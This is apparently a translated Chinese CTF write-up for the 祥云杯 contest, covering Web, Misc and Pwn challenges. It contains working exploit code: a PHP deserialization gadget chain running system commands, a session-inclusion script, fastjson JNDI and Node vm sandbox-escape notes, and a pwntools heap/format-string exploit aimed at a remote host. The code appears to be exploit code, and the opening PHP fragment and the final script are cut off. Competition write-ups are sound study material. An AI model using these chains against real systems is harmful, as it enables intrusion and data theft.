# 祥云杯 By 天璇Merak
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Web
###  ezyii
网上现有的链子github
    processes[]=new DefaultGenerator(new AppendStream());
                $this->output=new DefaultGenerator('jiang');
            }
        }
        echo urlencode(serialize(new RunProcess()));
    }
    namespace Faker{
        class DefaultGenerator
    {
        protected $default;
        public function __construct($default = null)
        {
            $this->default = $default;
    }
    }
    }
    namespace GuzzleHttp\Psr7{
        use Faker\DefaultGenerator;
        final class AppendStream{
            private $streams = [];
            private $seekable = true;
            public function __construct(){
                $this->streams[]=new CachingStream();
            }
        }
        final class CachingStream{
            private $remoteStream;
            public function __construct(){
                $this->remoteStream=new DefaultGenerator(false);
                $this->stream=new  PumpStream();
            }
        }
        final class PumpStream{
            private $source;
            private $size=-10;
            private $buffer;
            public function __construct(){
                $this->buffer=new DefaultGenerator('j');
                include("closure/autoload.php");
                $a = function(){system('cat /flags_c');phpinfo();    };
                $a = \Opis\Closure\serialize($a);
                $b = unserialize($a);
                $this->source=$b;
            }
        }
    }
###  安全检测
考虑session文件包含发现会包含url2直接多加个参数call_user_func执行命令
    import requests
    from requests import Response
    from requests.api import head
    url = "http://eci-2zefgf3p1ush1igogvo9.cloudeci1.ichunqiu.com"
    s = requests.session()
    username = "PD9waHAgcGhwaW5mbygpOz8+"
    sessid = 'c899a0d6935a15da7e42e02b9fe0a16c'
    headers={"Cookie":F"PHPSESSID={sessid}"}
    data= {
        "username":username
    }
    res = s.post(f"{url}/login.php",json=data)
    sessid= s.cookies.get_dict()['PHPSESSID']
    print(sessid)
    payload = f'http://127.0.0.1/admin/include123.php/?u=/tmp/sess_{sessid}&p='
    p = {
        "url1":payload
    }
    res = s.post(f"{url}/check2.php",data=p)
    print(res.text)
    res = s.get(f"{url}/preview.php")
    print(res.text)
###  层层穿透
第一层是一个Apache Flink的任意jar包上传漏洞，网上有现成的复现，msf生成一个jar上传执行然后就能getshell
进入后查看`/etc/hosts`发现有内网环境，而且也给出了内网地址，发现内网还存在一个主机，并且开放8080端口，发现存在shiro框架，结合`web.jar`发现需要登录，以`admin
123456`登录后发现`/admin/test`存在`json.parse`结合fastjson版本可以构造json数据进行JNDI注入
长度可以添加脏数据绕过，黑名单的话是使用`org.apache.shiro.realm.jndi.JndiRealmFactory`触发类
###  crawler_z
题目是考察沙箱逃逸，发现`zombie`有vm库并且在解析script和url的时候调用  
runInContext，将`script`内容作为第一个参数code
[https://www.kitsch.live/2020/11/23/nodejs-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/](https://)
可以使用this.constructor.constructor沙箱逃逸，本地构造构造一个html，写好对应的script
    import requests
    import requests
    url = "http://eci-2zedk1cbvvahdw0qqutk.cloudeci1.ichunqiu.com:8888/"
    s = requests.session()
    def signup(name):
        signup_url = url + 'signin'
        data = {
            'username': name,
            'password': name,
        }
        tmp = s.post(url=signup_url,data=data)
        #print(tmp.text)
    def change(bucket):
        change_url = url + "user/profile"
        burp0_url = change_url
        burp0_cookies = {"UM_distinctid": "17b3b13d148148-0b15ca7c6d5376-35607403-1aeaa0-17b3b13d149826",
                         "CNZZDATA155540": "cnzz_eid%3D1910689585-1628779580-%26ntime%3D1628784980",
                         "connect.sid": "s%3AUbIPQ4BQWGBQ4Ym1FG3Eqh4c7PPKC2I5.NMUmomM4LvCfTVTOKnXRk%2BzZD4CnUL7vr6QYNYZGsz4"}
        burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                         "Origin": "http://192.168.0.11:9999", "Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                         "Referer": "http://192.168.0.11:9999/user/profile", "Accept-Encoding": "gzip, deflate",
                         "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        burp0_data = {"affiliation": "ichunqiu", "age": "20",
                      "bucket": "https://09e8195ebf97db5752c72731c7e75995.oss-cn-beijing.ichunqiu.com/"}
        tmp = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,allow_redirects=False)
        print(tmp.status_code)
        print(tmp.headers['Location'])
        token = tmp.headers['Location'][19:]
        burp1_data = {"affiliation": "ichunqiu",
                      "age": "20",
                      "bucket": bucket
                      }
        tmp = s.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp1_data, allow_redirects=False)
        ver_url = url + 'user/verify?token=' + token
        tmp = s.get(url=ver_url)
        #print(tmp.text)
    def vist():
        vist_url = url + 'user/bucket'
        tmp = s.get(vist_url)
        print(tmp.text)
    signup('crispr1')
    chage_website = "http://47.95.219.96/test.html?a=oss-cn-beijing.ichunqiu.com"
    change(chage_website)
    vist()
访问对应的html然后监听:
###  secrets_of_admin
进去之后发现存在admin的密码已知，进去之后调用了`http-pdf`库，该库存在任意文件读取漏洞，而`$contents`存在xss，而在这里对`content`进行了过滤，可以使用数组绕过，当其为数组时`include()`会失败，基于`req.socket.remoteAddress`无法绕过,因此可以利用`xhr`进行SSRF，来访问`/api/files`
可以将`/etc/passwd`上传到`admin`用户，`checksum`任意，然后我们利用`/api/files/checksum`来读取文件  
先试下能不能xss发现存在xss:
那直接xhr访问127.0.0.1即可，注意ts开放在8888端口，这里被坑了很久。。。。
访问下载flag即可
## Misc
###  ChieftainsSecret
通过给出的附件我们可以得到PC0-3  
通过板子我们搜到一些文档，可以得到类似如下的公式
        arcs=math.asin((SIN_P[i]-SIN_N[i])/2030)
        arcc=math.acos((COS_P[i]-COS_N[i])/2030)
然后利用1对arcs 和 arcc来确定我们的象限。  
可以得到一些角度。我们可以发现这些角度呈现一种波峰波谷的状态。  
我们通过另外的脚本处理可以得到几个波峰的大致角度
    200
    200
    270
    225
    160
    250
    180
    90
    150
    150
    200
通过计算我们可知大概一格是22.5度。从拨片那里开始计算角度。再加上手指的宽度以及一些误差  
得到电话号  
flag{77085962457}
###  层层取证
题目比较有趣。通过Elcomfost首先可以扫到内存里有一个bitlocker加密密钥。  
然后我们通过diskgenius等工具恢复flag.txt得到提示：仿真。
利用仿真制作了一个仿真系统。将几个磁盘读入进去之后，他直接显示了高级账户的密码：xiaoming_handsome  
登录之后我们可以发现桌面上的便签写了一个；文档密码xiaoming1314  
然后我们可以发现有一个F盘是bitlocker锁住了。通过之前的加密密钥导入可以解锁盘拿到流量包。流量包中包含有一个rar udp流直接提取即可。  
密码是xiaoming_handsome里面的flag.docx密码是xiaoming1314。得到flag
###  考古
给了一个内存。可以从中获取到hint是一个OneClick.exe。可以直接利用vol
dump下来。之后我们开始逆向这个东西，发现他是以dot形式写了一个文件进入一个目录。我们利用虚拟机正常执行即可得到。然后我们可以发现他的word里利用010editor和正常word相比多出了一些东西。考虑可能是宏？但是一般宏会有一些特殊的opcode以及定义，考虑单纯是加密的文本，利用xortool一把锁。发现xor密钥是chr(45)得到flag
###  鸣雏恋
题目比较简单，直接利用zip打开发现里面隐藏的文件还有一个key.txt.  
当时利用phpstorm打开发现了奇怪的字符。利用零宽度隐写解密得到key。  
解密压缩包10w+张图片只有2种考虑转01 ，后续有base解密图片一把梭
    import os
    import tqdm
    import base64
    result=''
    for i in range(0,129488):
        filename="{}.png".format(str(i))
        if os.path.getsize(filename)==262:
            result+='0'
        else:
            result+='1'
    from Crypto.Util.number import *
    result=long_to_bytes(int(result,2))
    while(1):
        try:
            result=base64.b64decode(result)
        except:
            print(result)
## Pwn
###  note
先多申请几个chunk，格式化字符串改小top chunk,再申请，利用house of orange造出unsorted
bin，再申请一个chunk利用最后一字节固定泄露基址。  
然后格式化字符串修改`malloc_hook`为`realloc+12`，修改`realloc_hook`为one_gadget，调整栈桢打one_gadget。
    from pwn import*
    context(os='linux', arch='amd64', log_level='debug')
    #r = process('./note')
    r = remote('47.104.70.90',25315)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def add(size, con):
        r.sendlineafter('choice: ', str(1))
        r.sendlineafter('size: ', str(size))
        r.sendlineafter('content: ', con)
    def say(addr):
        r.sendlineafter('choice: ', str(2))
        r.sendlineafter('say ? ', addr)
    def show():
        r.sendlineafter('choice: ', str(3))
    for i in range(14):
        add(0x100,"aaa")
    add(0x40, "aaa")
    r.recvuntil('0x')
    addr = int(r.recv(12), 16)
    print hex(addr)
    fake_size = 0x00
    fmt = fmtstr_payload(6,{addr + 74: fake_size},write_size='short')
    print "fmtstr_payload ==> ",fmt
    say(fmt)
    add(0x100, 'aaa')
    r.sendlineafter('choice: ', str(1))